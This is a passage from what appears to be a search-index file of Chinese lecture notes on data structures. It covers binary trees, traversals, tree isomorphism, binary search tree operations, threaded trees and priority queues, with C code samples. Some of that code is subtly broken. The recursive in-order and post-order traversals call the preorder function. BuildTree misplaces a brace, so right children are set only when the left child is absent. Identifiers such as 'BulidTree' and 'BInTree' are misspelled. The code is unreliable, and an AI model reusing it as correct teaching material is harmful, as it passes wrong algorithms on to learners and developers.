\u5c42\uff0c\u5176\u4ed6\u4efb\u4e00\u8282\u70b9\u7684\u5c42\u6570\u662f\u5176\u7236\u8282\u70b9\u7684\u5c42\u6570\u52a0 1</li> <li>\u6811\u7684\u6df1\u5ea6 (Depth) : \u6811\u4e2d\u6240\u6709\u8282\u70b9\u4e2d\u6700\u5927\u5c42\u6b21\u662f\u8fd9\u68f5\u6811\u7684\u6df1\u5ea6</li> </ol> Quote"}, {"location": "Course/FDS/Lec03/#_3", "title": "\u4e8c\u53c9\u6811\u7684\u5b9a\u4e49", "text": "<ul> <li>\u4e8c\u53c9\u6811 (binary tree) : \u901a\u5e38\u6307\u6709\u6839\u4e8c\u53c9\u6811\u3002\u6bcf\u4e2a\u8282\u70b9\u81f3\u591a\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\u7684\u6811\u3002\u901a\u5e38\u5c06\u5b50\u8282\u70b9\u786e\u5b9a\u4e00\u4e2a\u987a\u5e8f\uff0c\u79f0\u5de6\u5b50\u8282\u70b9\u548c\u53f3\u5b50\u8282\u70b9</li> <li>\u7279\u6b8a\u4e8c\u53c9\u6811<ol> <li>\u6ee1\u4e8c\u53c9\u6811 (full/proper binary tree) : \u6bcf\u4e2a\u8282\u70b9\u7684\u5b50\u8282\u70b9\u5747\u4e3a 0 \u6216 2 \u4e2a \\(leaves = nodes-\\frac{nodes-1}{2}\\) </li> <li>\u5b8c\u7f8e\u4e8c\u53c9\u6811(perfect binary tree): \u6240\u6709\u53f6\u8282\u70b9\u6df1\u5ea6\u5747\u76f8\u540c\u7684\u4e8c\u53c9\u6811\u2014\u2014\u6df1\u5ea6\u4e3a k (k \\(\\ge\\) -1) \u4e14\u6709 2<sup>k+1</sup> - 1 \u4e2a\u8282\u70b9</li> <li>\u5b8c\u5168\u4e8c\u53c9\u6811 (complete binary tree) : \u4ec5\u6700\u6df1\u4e24\u5c42\u8282\u70b9\u7684\u5ea6\u53ef\u4ee5\u5c0f\u4e8e2\uff0c\u4e14\u6700\u6df1\u4e00\u5c42\u7684\u8282\u70b9\u90fd\u96c6\u4e2d\u5728\u8be5\u5c42\u6700\u5de6\u8fb9\u7684\u8fde\u7eed\u4f4d\u7f6e\u4e0a || \u6240\u6709\u8282\u70b9\u7684\u7f16\u53f7\u90fd\u4e0e\u6ee1\u4e8c\u53c9\u6811\u4e2d\u7684\u7f16\u53f7\u76f8\u540c\u7684\u4e8c\u53c9\u6811</li> <li>\u659c\u4e8c\u53c9\u6811 (skewed binary tree) : \u6ca1\u6709\u4efb\u4f55\u5de6/\u53f3\u8282\u70b9\u7684\u6811\uff0c\u79f0\u4e3a\u53f3/\u5de6\u659c\u4e8c\u53c9\u6811</li> </ol> </li> </ul>"}, {"location": "Course/FDS/Lec03/#_4", "title": "\u4e8c\u53c9\u6811\u7684\u51e0\u4e2a\u91cd\u8981\u6027\u8d28", "text": "<ol> <li>\u4e00\u4e2a\u4e8c\u53c9\u6811\u7b2c i \u5c42\u7684\u6700\u5927\u8282\u70b9\u6570\u4e3a: 2<sup>i-1</sup> , i \\(\\ge\\) 1</li> <li>\u6df1\u5ea6\u4e3a k \u7684\u4e8c\u53c9\u6811\u6709\u6700\u5927\u8282\u70b9\u603b\u6570\u4e3a: 2<sup>k</sup> - 1 , k \\(\\ge\\) 1</li> <li>\u5bf9\u4efb\u4f55\u975e\u7a7a\u4e8c\u53c9\u6811\uff0c\u82e5 n<sub>0</sub> \u8868\u793a\u53f6\u8282\u70b9\u7684\u4e2a\u6570\u3001n<sub>2</sub> \u662f\u5ea6\u4e3a2\u7684\u975e\u53f6\u8282\u70b9\u4e2a\u6570\uff0c\u90a3\u4e48\u4e24\u8005\u6ee1\u8db3\u5173\u7cfb n<sub>0</sub> = n<sub>2</sub> + 1 <p>\u8282\u70b9\u6570\u76ee = \u6240\u6709\u8282\u70b9\u7684\u5ea6\u6570\u548c + 1</p> </li> </ol>"}, {"location": "Course/FDS/Lec03/#_5", "title": "\u4e8c\u53c9\u6811\u7684\u62bd\u8c61\u6570\u636e\u7c7b\u578b", "text": "<ul> <li>\u7c7b\u578b\u540d\u79f0 : \u4e8c\u53c9\u6811</li> <li> <p>\u6570\u636e\u5bf9\u8c61\u96c6 : \u4e00\u4e2a\u6709\u7a77\u7684\u8282\u70b9\u96c6\u5408\u3002\u82e5\u4e0d\u4e3a\u7a7a\uff0c\u5219\u7531\u6839\u8282\u70b9\u548c\u5176\u5de6\u3001\u53f3\u4e8c\u53c9\u5b50\u6811\u7ec4\u6210</p> </li> <li> <p>\u64cd\u4f5c\u96c6 : BT \\(\\in\\) BinTree\uff0cItem \\(\\in\\) ElementType, \u91cd\u8981\u64cd\u4f5c\u6709\uff1a</p> </li> </ul> <p>Note</p> <ol> <li>Bool IsEmpty( BinTree BT ): \u5224\u65ad BT \u662f\u5426\u4e3a\u7a7a</li> <li>void Traversal( BinTree BT ): \u904d\u5386\uff0c\u6309\u67d0\u987a\u5e8f\u8bbf\u95ee\u6bcf\u4e2a\u8282\u70b9</li> <li>BinTree CreateBinTree( ): \u521b\u5efa\u4e00\u4e2a\u4e8c\u53c9\u6811</li> </ol>"}, {"location": "Course/FDS/Lec03/#_6", "title": "\u4e8c\u53c9\u6811\u7684\u5b58\u50a8\u7ed3\u6784", "text": ""}, {"location": "Course/FDS/Lec03/#_7", "title": "\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784", "text": "<ol> <li>\u5b8c\u5168\u4e8c\u53c9\u6811: \u4ece\u4e0a\u5230\u4e0b\u3001\u4ece\u5de6\u81f3\u53f3\u987a\u5e8f\u5b58\u50a8n\u4e2a\u8282\u70b9\u7684\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u8282\u70b9\u7236\u5b50\u5173\u7cfb\uff1b</li> </ol> <p>Example</p> <p>  \u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u8282\u70b9\u6570: \\(n_0 = \\frac{n+1}{2}\\)         1. \u5f53n\u4e3a\u5076\u6570\u65f6\uff0c\\(n_0 = \\frac{n}{2}\\)         2. \u5f53n\u4e3a\u5947\u6570\u65f6\uff0c\\(n_0 = \\frac{n+1}{2}\\)</p> <ul> <li>\u975e\u6839\u8282\u70b9 (\u5e8f\u53f7 i &gt; 1) \u7684\u7236\u8282\u70b9\u7684\u5e8f\u53f7\u662f \\(\\lfloor \\frac{i}{2} \\rfloor\\) (\u4e0d\u8d85\u8fc7 i/2 \u7684\u6700\u5927\u6574\u6570) <ul> <li>\u8282\u70b9 (\u5e8f\u53f7\u4e3a i ) \u7684\u5de6\u5b69\u5b50\u8282\u70b9\u7684\u5e8f\u53f7\u662f 2i (2i \\(\\le\\) n\uff0c\u5426\u5219\u6ca1\u6709\u5de6\u5b69\u5b50) </li> <li>\u8282\u70b9 (\u5e8f\u53f7\u4e3a i ) \u7684\u53f3\u5b69\u5b50\u8282\u70b9\u7684\u5e8f\u53f7\u662f 2i+1 (2i+1 \\(\\le\\) n\uff0c\u5426\u5219\u6ca1\u6709\u53f3\u5b69\u5b50)  2. \u4e00\u822c\u4e8c\u53c9\u6811: \u4e5f\u53ef\u4ee5\u91c7\u7528\u4e0a\u8ff0\u7ed3\u6784\uff0c\u4f46\u4f1a\u9020\u6210\u7a7a\u95f4\u6d6a\u8d39</li> </ul> </li> </ul> Example <p></p> <ul> <li>\u94fe\u8868\u5b58\u50a8(\u6bcf\u4e2a\u8282\u70b9\u7684\u7ed3\u6784\u53ef\u4ee5\u5982\u4e0b\u8868\u793a)</li> </ul> <p>Note</p> <pre><code>    typedef struct TreeNode *BinTree;\n    typedef BinTree Position;\n    struct TreeNode{\n        ElementType Data;\n        BinTree Left;\n        BinTree Right;\n    }\n</code></pre>"}, {"location": "Course/FDS/Lec03/#_8", "title": "\u4e8c\u53c9\u6811\u7684\u904d\u5386", "text": ""}, {"location": "Course/FDS/Lec03/#preorder", "title": "\u5148\u5e8f\u904d\u5386 | PreOrder", "text": "<ul> <li>\u904d\u5386\u8fc7\u7a0b<ol> <li>\u8bbf\u95ee\u6839\u8282\u70b9</li> <li>\u5148\u5e8f\u904d\u5386\u5de6\u5b50\u6811</li> <li>\u5148\u5e8f\u904d\u5386\u53f3\u5b50\u6811</li> </ol> Example <p> print\u7684\u987a\u5e8f \\(\\Rightarrow\\) A B D F E C G H I</p> </li> </ul> \u9012\u5f52\u7b97\u6cd5 <pre><code>  void PreOrderTraversal( BinTree BT)\n  {\n      if( BT ){\n          printf(\"%d\", BT-&gt;Data);\n          PreOrderTraversal(BT-&gt;Left);\n          PreOrderTraversal(BT-&gt;Right);\n      }\n  }\n</code></pre>"}, {"location": "Course/FDS/Lec03/#inorder", "title": "\u4e2d\u5e8f\u904d\u5386 | InOrder", "text": "<ul> <li>\u904d\u5386\u8fc7\u7a0b<ol> <li>\u4e2d\u5e8f\u904d\u5386\u5176\u5de6\u5b50\u6811</li> <li>\u8bbf\u95ee\u6839\u8282\u70b9</li> <li>\u4e2d\u5e8f\u904d\u5386\u5176\u53f3\u5b50\u6811</li> </ol> Example <p> print\u7684\u987a\u5e8f \\(\\Rightarrow\\) D B E F A G H C I</p> </li> </ul> \u9012\u5f52\u7b97\u6cd5 <pre><code>  void InOrderTraversal( BInTree BT)\n  {\n      if( BT ){\n          PreOrderTraversal(BT-&gt;Left);\n          printf(\"%d\", BT-&gt;Data);\n          PreOrderTraversal(BT-&gt;Right);\n      }\n  }\n</code></pre> \u975e\u9012\u5f52\u7b97\u6cd5 <pre><code>  void InOrderTraversal(BinTree BT)\n  {\n      BinTree T = BT;\n      Stack S = CreatStack(MaxSize);    /*\u521b\u5efa\u5e76\u521d\u59cb\u5316\u5806\u6808S*/\n      while(T || !IsEmpty(S))\n      {\n          while(T)                  /*\u4e00\u76f4\u5411\u5de6\u5e76\u5c06\u6cbf\u9014\u8282\u70b9\u538b\u5165\u5806\u6808*/\n          {\n              Push(S, T);\n              T = T-&gt;Left;\n          }\n          if(!IsEmpty(S))\n          {\n              T = Pop(S);               /*\u8282\u70b9\u5f39\u51fa\u5806\u6808*/\n              printf(\"%5d\", T-&gt;Data);   /*\uff08\u8bbf\u95ee\uff09\u6253\u5370\u8282\u70b9*/\n              T = T-&gt;Right;         /*\u8f6c\u5411\u53f3\u5b50\u6811*/\n          }\n      }\n  }\n</code></pre>"}, {"location": "Course/FDS/Lec03/#postorder", "title": "\u540e\u5e8f\u904d\u5386 | PostOrder", "text": "<ul> <li>\u904d\u5386\u8fc7\u7a0b<ol> <li>\u540e\u5e8f\u904d\u5386\u5176\u5de6\u5b50\u6811</li> <li>\u540e\u5e8f\u904d\u5386\u5176\u53f3\u5b50\u6811</li> <li>\u8bbf\u95ee\u6839\u8282\u70b9</li> </ol> Example <p> print\u7684\u987a\u5e8f \\(\\Rightarrow\\) D E F B H G I C A</p> </li> </ul> \u9012\u5f52\u7b97\u6cd5 <pre><code>  void PostOrderTraversal( BInTree BT)\n  {\n      if( BT ){\n          PreOrderTraversal(BT-&gt;Left);\n          PreOrderTraversal(BT-&gt;Right);\n          printf(\"%d\", BT-&gt;Data);\n      }\n  }\n</code></pre>"}, {"location": "Course/FDS/Lec03/#levelorder", "title": "\u5c42\u5e8f\u904d\u5386 | LevelOrder", "text": "<ul> <li>\u5c42\u5e8f\u57fa\u672c\u8fc7\u7a0b:<ol> <li>\u6839\u8282\u70b9\u5165\u961f</li> <li>\u4ece\u961f\u5217\u4e2d\u53d6\u51fa\u4e00\u4e2a\u5143\u7d20</li> <li>\u8bbf\u95ee\u8be5\u5143\u7d20\u6240\u6307\u8282\u70b9</li> <li>\u82e5\u8be5\u5143\u7d20\u6240\u6307\u8282\u70b9\u7684\u5de6\u3001\u53f3\u5b69\u5b50\u8282\u70b9\u975e\u7a7a\uff0c\u5219\u5c06\u5176\u5de6\u3001\u53f3\u5b69\u5b50\u7684\u6307\u9488\u5165\u961f</li> </ol> </li> </ul> \u5c42\u5e8f\u904d\u5386\u7684\u961f\u5217\u5b9e\u73b0 <pre><code>void LevelOrderTraversal(BinTree BT)\n{\n    Queue Q;\n    BinTree T;\n    if(!BT) return;             /*\u82e5\u662f\u7a7a\u6811\u5219\u76f4\u63a5\u8fd4\u56de*/\n    Q = CreatQueue(MaxSize);    /*\u521b\u5efa\u5e76\u521d\u59cb\u5316\u961f\u5217Q*/\n    AddQ(Q, BT);\n    while(!IsEmptyQ(Q))\n    {\n        T = DeleteQ(Q);\n        printf(\"%d\\n\", T-&gt;Data);    /*\u8bbf\u95ee\u53d6\u51fa\u961f\u5217\u7684\u8282\u70b9*/\n        if(T-&gt;Left)     \n            AddQ(Q, T-&gt;Left);\n        if(T-&gt;Right)\n            AddQ(Q, T-&gt;Right);\n    }\n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/#_9", "title": "\u5efa\u6811\u53ca\u540c\u6784\u5224\u522b", "text": ""}, {"location": "Course/FDS/Lec03/#_10", "title": "\u4e8c\u53c9\u6811\u8868\u793a", "text": "<ul> <li>\u7ed3\u6784\u6570\u7ec4\u8868\u793a\u4e8c\u53c9\u6811: \u9759\u6001\u94fe\u8868</li> </ul> \u4e8c\u53c9\u6811\u8868\u793a<pre><code>    #define MaxTree 10\n    #define ElementType char\n    #define Tree int\n    #define Null -1\n    struct TreeNode\n    {\n        ElementType Element;\n        Tree Left;\n        Tree Right;\n    }T1[MaxTree], T2[MaxTree];\n</code></pre>"}, {"location": "Course/FDS/Lec03/#_11", "title": "\u7a0b\u5e8f\u6846\u67b6\u642d\u5efa", "text": "Pseudocode: main_function<pre><code>    int main()\n    {\n        \u5efa\u4e8c\u53c9\u68111;\n        \u5efa\u4e8c\u53c9\u68112;\n        \u5224\u65ad\u662f\u5426\u540c\u6784\u5e76\u8f93\u51fa;\n\n        return 0;\n    }\n</code></pre> code <p>main<pre><code>int main()\n{\n    Tree R1, R2;\n\n    R1 = BuildTree(T1);\n    R2 = BuildTree(T2);\n    if(Isomorphic(R1, R2))\n        printf(\"Yes\\n\");\n    else\n        printf(\"No\\n\");\n\n    return 0;\n}\n</code></pre> BuildTree<pre><code>Tree BulidTree(struct TreeNode T[])\n{\n    \u00b7\u00b7\u00b7\n    scanf(\"%d\\n\", &amp;N);\n    if(N)\n    {\n        for(i=0; i&lt;N; i++)\n        {\n            scanf(\"%c %c %c\\n\", &amp;T[i].Element, &amp;cl, &amp;cr);\n            if(cl != '-')\n            {\n                T[i].Left = cl-'0';\n                check[T[i].Left] = 1;\n            }\n            else\n            {\n                T[i].Left = Null;\n                T[i].Right = cr-'0';\n                check[T[i].Right] = 1;\n            }\n            for(i=0; i&lt;N; i++)\n                if(!check[i]) \n                    break;\n            Root = i;\n        }\n    }\n    return Root;\n}\n</code></pre> \u5224\u65ad\u540c\u6784<pre><code>int Isomorphic(Tree R1, Tree R2)\n{\n    if((R1==Null) &amp;&amp; (R2==Null))\n        return 1;\n    if(((R1==Null) &amp;&amp; (R2!=Null)) || ((R1!=Null) &amp;&amp; (R2==Null)))\n        return 0;\n    if(T1[R1].Element != T2[R2].Element)\n        return 0;\n    if((T1[R1].Left == Null) &amp;&amp; (T2[R2].Left == Null))\n        return Isomorphic(T1[R1].Right, T2[R2].Right);\n\n    if(((T1[R1].Left != Null) &amp;&amp; (T2[R2].Left != Null))&amp;&amp;\n    ((T1[T1[R1].Left].Element) == (T2[T2[R2].Left].Element)))\n        return (Isomorphic(T1[R1].Left,T2[R2].Left ) &amp;&amp;\n                Isomorphic(T1[R1].Right,T2[R2].Right ));\n    else\n        return (Isomorphic(T1[R1].Left,T2[R2].Right ) &amp;&amp;\n                Isomorphic(T1[R1].Right,T2[R2].Left ));\n\n}\n</code></pre></p>"}, {"location": "Course/FDS/Lec03/#binary-search-treebst", "title": "\u4e8c\u53c9\u641c\u7d22\u6811 | Binary Search Tree(BST)", "text": "<p>\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u4e5f\u79f0\u4e8c\u53c9\u6392\u5e8f\u6811\u6216\u4e8c\u53c9\u67e5\u627e\u6811 (\u4e2d\u5e8f\u904d\u5386\u4e00\u5b9a\u6ee1\u8db3\u9012\u589e)</p> <ul> <li>\u4e00\u68f5\u4e8c\u53c9\u6811\u53ef\u4ee5\u4e3a\u7a7a\uff1b\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6027\u8d28\uff1a<ol> <li>\u975e\u7a7a\u5de6\u5b50\u6811\u7684\u6240\u6709\u952e\u503c\u5c0f\u4e8e\u5176\u6839\u8282\u70b9\u7684\u952e\u503c</li> <li>\u975e\u7a7a\u53f3\u5b50\u6811\u7684\u6240\u6709\u952e\u503c\u5927\u4e8e\u5176\u6839\u8282\u70b9\u7684\u952e\u503c</li> <li>\u5de6\u3001\u53f3\u5b50\u6811\u90fd\u662f\u4e8c\u53c9\u641c\u7d22\u6811</li> </ol> </li> </ul>"}, {"location": "Course/FDS/Lec03/#bst", "title": "BST\u7684\u7279\u522b\u51fd\u6570", "text": ""}, {"location": "Course/FDS/Lec03/#find", "title": "Find()", "text": "<p>\u4eceBST\u4e2d\u67e5\u627e\u5143\u7d20 X, \u8fd4\u56de\u5176\u6240\u5728\u8282\u70b9\u7684\u5730\u5740</p> <ol> <li>\u67e5\u627e\u4ece\u6839\u8282\u70b9\u5f00\u59cb\uff0c\u5982\u679c\u6811\u4e3a\u7a7a\uff0c\u8fd4\u56de NULL</li> <li>\u82e5\u641c\u7d22\u6811\u975e\u7a7a\uff0c\u5219\u5c06\u6839\u8282\u70b9\u5173\u952e\u5b57\u548c X \u8fdb\u884c\u6bd4\u8f83\uff0c\u5e76\u8fdb\u884c\u4e0d\u540c\u5904\u7406:<ol> <li>\u82e5 X \u5c0f\u4e8e\u6839\u8282\u70b9\u952e\u503c\uff0c\u53ea\u9700\u5728\u5de6\u5b50\u6811\u4e2d\u7ee7\u7eed\u641c\u7d22</li> <li>\u82e5\u5927\u4e8e\uff0c\u5219\u5728\u53f3\u5b50\u6811\u4e2d\u7ee7\u7eed\u641c\u7d20</li> <li>\u82e5\u76f8\u7b49\uff0c\u641c\u7d22\u5b8c\u6210\uff0c\u8fd4\u56de\u6307\u5411\u6b64\u8282\u70b9\u7684\u6307\u9488</li> </ol> </li> </ol> code <p><pre><code>Position Find( ElementType X, BinTree BST )\n{\n    if( !BST)   return NULL;\n    if( X &gt; BST-&gt;Data )\n        return Find( X, BST-&gt;Right );   /*\u5c3e\u9012\u5f52*/\n    else if( X &lt; BST-&gt;Data)\n        return Find( X, BST-&gt;Left );    /*\u5c3e\u9012\u5f52*/\n    else\n        return BST;\n}\n</code></pre> \u7531\u4e8e\u975e\u9012\u5f52\u51fd\u6570\u6267\u884c\u6548\u7387\u9ad8\uff0c\u53ef\u5c06\u201c\u5c3e\u9012\u5f52\u201d\u51fd\u6570\u6539\u4e3a\u8fed\u4ee3\u51fd\u6570 <pre><code>Position IterFind( ElementType X, BinTree BST)\n{\n    while( BST )\n    {\n        if( X &gt; BST-&gt;Data )\n            BST = BST-&gt;Right;\n        else if( X &lt; BST-&gt;Data )\n            BST = BST-&gt;Left;\n        else\n            return BST;\n    }\n    return NULL;\n}\n</code></pre></p>"}, {"location": "Course/FDS/Lec03/#findmin", "title": "FindMin()", "text": "<ul> <li>\u4eceBST\u4e2d\u67e5\u627e\u5e76\u8fd4\u56de\u6700\u5c0f\u5143\u7d20\u6240\u5728\u8282\u70b9\u7684\u5730\u5740</li> <li>\u6700\u5c0f\u5143\u7d20\u4e00\u5b9a\u5728\u6811\u7684\u6700\u5de6\u5206\u652f\u7684\u7aef\u8282\u70b9\u4e0a</li> </ul> <pre><code>Position FindMin( BinTree BST)\n{\n    if( !BST )\n        return NULL;\n    else if( !BST-&gt;Left)\n        return BST;\n    else\n        return FindMin( BST-&gt;Left );\n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/#findmax", "title": "FindMax()", "text": "<ul> <li>\u4ece\u4e8c\u53c9\u641c\u7d22\u6811BST\u4e2d\u67e5\u627e\u5e76\u8fd4\u56de\u6700\u5927\u5143\u7d20\u6240\u5728\u8282\u70b9\u7684\u5730\u5740</li> <li>\u6700\u5927\u5143\u7d20\u4e00\u5b9a\u5728\u6811\u7684\u6700\u53f3\u5206\u652f\u7684\u7aef\u8282\u70b9\u4e0a</li> </ul> <pre><code>Position FindMax( BinTree BST)\n{\n    if( !BST )\n        return NULL;\n    else\n        while( BST-&gt;Right )\n            BST = BST-&gt;Right;\n    return BST;\n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/#insert", "title": "Insert()", "text": "<ul> <li>\u63d2\u5165X(\u53ef\u4ee5\u91c7\u7528\u4e0eFind\u7c7b\u4f3c\u7684\u65b9\u6cd5)</li> </ul> <pre><code>BinTree Insert( ElementType X, BinTree BST)\n{\n    if( !BST )\n    {\n        BST = malloc(sizeof(struct TreeNode));\n        BST-&gt;Data = X;\n        BST-&gt;Left = NULL;\n        BST-&gt;Right = NULL;\n    }\n    else\n    {\n        if( X &lt; BST-&gt;Data )\n            BST-&gt;Left = Insert( X, BST-&gt;Left);\n        else if( X &gt; BST-&gt;Data)\n            BST-&gt;Right = Insert( X, BST-&gt;Right);\n    }\n    return BST;\n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/#delete", "title": "Delete()", "text": "<ul> <li>\u8003\u8651\u4e09\u79cd\u60c5\u51b5<ol> <li>\u8981\u5220\u9664\u7684\u8282\u70b9\u662f\u53f6\u8282\u70b9\uff1a\u76f4\u63a5\u5220\u9664\uff0c\u5e76\u518d\u4fee\u6539\u5176\u7236\u8282\u70b9\u6307\u9488\u2014\u2014\u7f6e\u4e3aNULL</li> <li>\u8981\u5220\u9664\u7684\u8282\u70b9\u53ea\u6709\u4e00\u4e2a\u5b69\u5b50\u8282\u70b9\uff1a\u5c06\u5176\u7236\u8282\u70b9\u7684\u6307\u9488\u6307\u5411\u8981\u5220\u9664\u8282\u70b9\u7684\u5b69\u5b50\u8282\u70b9</li> <li>\u8981\u5220\u9664\u7684\u8282\u70b9\u6709\u5de6\u53f3\u4e24\u9897\u5b50\u6811\uff1a\u7528\u53e6\u4e00\u8282\u70b9\u66ff\u4ee3\u88ab\u5220\u9664\u8282\u70b9\u2014\u2014\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u5143\u7d20 \u6216\u8005 \u5de6\u5b50\u6811\u7684\u6700\u5927\u5143\u7d20</li> </ol> </li> </ul> <pre><code>BinTree Delete( BinTree BST, ElementType X ) \n{ \n    Position Tmp; \n\n    if( !BST ) \n        printf(\"\u8981\u5220\u9664\u7684\u5143\u7d20\u672a\u627e\u5230\"); \n    else {\n        if( X &lt; BST-&gt;Data ) \n            BST-&gt;Left = Delete( BST-&gt;Left, X );   /* \u4ece\u5de6\u5b50\u6811\u9012\u5f52\u5220\u9664 */\n        else if( X &gt; BST-&gt;Data ) \n            BST-&gt;Right = Delete( BST-&gt;Right, X ); /* \u4ece\u53f3\u5b50\u6811\u9012\u5f52\u5220\u9664 */\n        else { /* BST\u5c31\u662f\u8981\u5220\u9664\u7684\u7ed3\u70b9 */\n            /* \u5982\u679c\u88ab\u5220\u9664\u7ed3\u70b9\u6709\u5de6\u53f3\u4e24\u4e2a\u5b50\u7ed3\u70b9 */ \n            if( BST-&gt;Left &amp;&amp; BST-&gt;Right ) {\n                /* \u4ece\u53f3\u5b50\u6811\u4e2d\u627e\u6700\u5c0f\u7684\u5143\u7d20\u586b\u5145\u5220\u9664\u7ed3\u70b9 */\n                Tmp = FindMin( BST-&gt;Right );\n                BST-&gt;Data = Tmp-&gt;Data;\n                /* \u4ece\u53f3\u5b50\u6811\u4e2d\u5220\u9664\u6700\u5c0f\u5143\u7d20 */\n                BST-&gt;Right = Delete( BST-&gt;Right, BST-&gt;Data );\n            }\n            else { /* \u88ab\u5220\u9664\u7ed3\u70b9\u6709\u4e00\u4e2a\u6216\u65e0\u5b50\u7ed3\u70b9 */\n                Tmp = BST; \n                if( !BST-&gt;Left )       /* \u53ea\u6709\u53f3\u5b69\u5b50\u6216\u65e0\u5b50\u7ed3\u70b9 */\n                    BST = BST-&gt;Right; \n                else                   /* \u53ea\u6709\u5de6\u5b69\u5b50 */\n                    BST = BST-&gt;Left;\n                free( Tmp );\n            }\n        }\n    }\n    return BST;\n}\n</code></pre> \u5f15\u7533 \u2014\u2014 n \u4e2a\u8282\u70b9\u7ec4\u6210\u591a\u5c11\u4e0d\u540c\u7684\u4e8c\u53c9\u641c\u7d22\u6811 <p>[\u5361\u7279\u5170\u6570] : \\(C_0 = 1, C_n = C_{n-1} \\times \\frac{4n-2}{n+1}\\)</p> Quote <p>CSDN - LeetCode96 n\u4e2a\u8282\u70b9\u7ec4\u6210\u7684\u4e0d\u540c\u4e8c\u53c9\u641c\u7d22\u6811</p>"}, {"location": "Course/FDS/Lec03/#threaded-binary-tree", "title": "\u7ebf\u7d22\u4e8c\u53c9\u6811 | Threaded binary tree", "text": "<ul> <li>Rule 1: \u82e5\u8282\u70b9\u7684\u5de6\u5b50\u6811\u4e3a\u7a7a\uff0c\u5c06\u5176\u7a7a\u5de6\u513f\u5b50\u6307\u5411\u4e2d\u5e8f\u904d\u5386\u524d\u9a71 (\u4e0a\u4e00\u4e2a\u904d\u5386\u7684\u8282\u70b9)</li> <li>Rule 2: \u7a7a\u53f3\u513f\u5b50\u6307\u5411\u4e2d\u5e8f\u904d\u5386\u7684\u540e\u7ee7 (\u82e5\u524d\u9a71/\u540e\u7ee7\u5747\u65e0\uff0c\u5219\u5f15\u51fa\u4e3a NULL)</li> <li>Rule 3: \u7ebf\u7d22\u4e8c\u53c9\u6811\u5fc5\u987b\u6709\u4e00\u4e2a\u5934\u8282\u70b9\u4e14\u5176\u5de6\u513f\u5b50\u6307\u5411\u7b2c\u4e00\u4e2a\u8282\u70b9</li> </ul> <p>\u5373\u5f53\u6ca1\u6709\u5de6 (\u6216\u53f3) \u513f\u5b50\u65f6, \u5176\u5de6 (\u6216\u53f3) \u513f\u5b50\u624d\u4f1a\u88ab\u6362\u6210 thread</p> <pre><code>typedef  struct  ThreadedTreeNode  *PtrTo  ThreadedNode;\ntypedef  struct  PtrToThreadedNode  ThreadedTree;\ntypedef  struct  ThreadedTreeNode {\n    int     LeftThread;   /* if it is TRUE, then Left */\n    ThreadedTree  Left;      /* is a thread, not a child ptr. */ \n    ElementType Element;\n    int     RightThread; /* if it is TRUE, then Right */\n    ThreadedTree  Right;    /* is a thread, not a child ptr. */\n}\n</code></pre> <p>Quote</p> <p>CSDN-\u7ebf\u7d22\u4e8c\u53c9\u6811</p>"}, {"location": "Course/FDS/Lec03/#priority-queues", "title": "\u4f18\u5148\u961f\u5217 | Priority Queues", "text": "<p>Abstract</p> <ul> <li>\u4f18\u5148\u961f\u5217 (priority queue) \u4e5f\u79f0\u4e3a\u5806 (heap)</li> <li>\u7279\u6b8a\u7684\u201d\u961f\u5217\u201d\uff0c\u53d6\u51fa\u5143\u7d20\u7684\u987a\u5e8f\u662f\u6309\u7167\u5143\u7d20\u7684\u4f18\u5148\u7ea7 (\u5173\u952e\u5b57) \u5927\u5c0f\uff0c\u800c\u4e0d\u662f\u5143\u7d20\u8fdb\u5165\u961f\u5217\u7684\u5148\u540e\u987a\u5e8f</li> </ul> \u5806\u7684\u4e00\u4e9b\u4f8b\u5b50 <p> \u56fe\u7247\u6458\u81ea MOOC</p>"}, {"location": "Course/FDS/Lec03/#_12", "title": "\u82e5\u91c7\u7528\u6570\u7ec4\u6216\u94fe\u8868\u5b9e\u73b0", "text": "<ul> <li>\u6570\u7ec4: <ul> <li>\u63d2\u5165 \u2014\u2014 \u5143\u7d20\u603b\u662f\u63d2\u5165\u5c3e\u90e8          ~ \\(\\Theta (1)\\) </li> <li>\u5220\u9664 \u2014\u2014 <ul> <li>\u67e5\u627e\u6700\u5927 (\u6216\u6700\u5c0f) \u5173\u952e\u5b57      ~ \\(\\Theta (n)\\) </li> <li>\u4ece\u6570\u7ec4\u4e2d\u5220\u53bb\u9700\u8981\u79fb\u52a8\u7684\u5143\u7d20     ~ \\(O(n)\\) </li> </ul> </li> </ul> </li> <li>\u94fe\u8868:<ul> <li>\u63d2\u5165 \u2014\u2014 \u5143\u7d20\u603b\u662f\u63d2\u5165\u94fe\u8868\u5934\u90e8       ~ \\(\\Theta (1)\\) </li> <li>\u5220\u9664 \u2014\u2014<ul> <li>\u67e5\u627e\u6700\u5927 (\u6216\u6700\u5c0f) \u5173\u952e\u5b57       ~ \\(\\Theta (n)\\) </li> <li>\u5220\u53bb\u8282\u70b9                     ~ \\(\\Theta (1)\\) </li> </ul> </li> </ul> </li> <li>\u6709\u5e8f\u6570\u7ec4:<ul> <li>\u63d2\u5165 \u2014\u2014 <ul> <li>\u627e\u5230\u5408\u9002\u7684\u4f4d\u7f6e                ~ \\(O(n)\\) \u6216 \\(O(log_2 n)\\) </li> <li>\u79fb\u52a8\u5143\u7d20\u5e76\u63d2\u5165                ~ \\(O(n)\\) </li> </ul> </li> <li>\u5220\u9664 \u2014\u2014 \u5220\u53bb\u6700\u540e\u4e00\u4e2a\u5143\u7d20           ~ \\(\\Theta (1)\\)</li> </ul> </li> <li>\u6709\u5e8f\u94fe\u8868: <ul> <li>\u63d2\u5165 \u2014\u2014 <ul> <li>\u627e\u5230\u5408\u9002\u7684\u4f4d\u7f6e                ~ \\(O(n)\\) </li> <li>\u63d2\u5165\u5143\u7d20                      ~ \\(\\Theta (1)\\) </li> </ul> </li> <li>\u5220\u9664 \u2014\u2014 \u5220\u9664\u9996\u5143\u7d20\u6216\u6700\u540e\u5143\u7d20      ~ \\(\\Theta (1)\\) </li> </ul> </li> </ul>"}, {"location": "Course/FDS/Lec03/#binary-heap", "title": 